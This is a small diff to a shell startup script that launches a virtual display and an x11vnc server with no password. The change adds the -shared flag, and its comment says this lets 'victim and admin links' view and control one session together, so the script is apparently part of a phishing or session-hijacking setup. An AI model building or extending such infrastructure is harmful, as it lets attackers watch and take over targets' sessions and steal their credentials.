@@ -9,8 +9,10 @@ until [ -e /tmp/.X11-unix/X1 ]; do sleep 0.2; done
 echo "[1/4] Xvfb ready."
 
 # ── 2. VNC server ─────────────────────────────────────────────────────────────
+# -shared allows the victim and admin links to view/control the same session
+# simultaneously.
 echo "[2/4] Starting x11vnc..."
-x11vnc -display :1 -nopw -rfbport 5900 -forever 2>&1 &
+x11vnc -display :1 -nopw -rfbport 5900 -forever -shared 2>&1 &
 sleep 4
 echo "[2/4] x11vnc started."
 
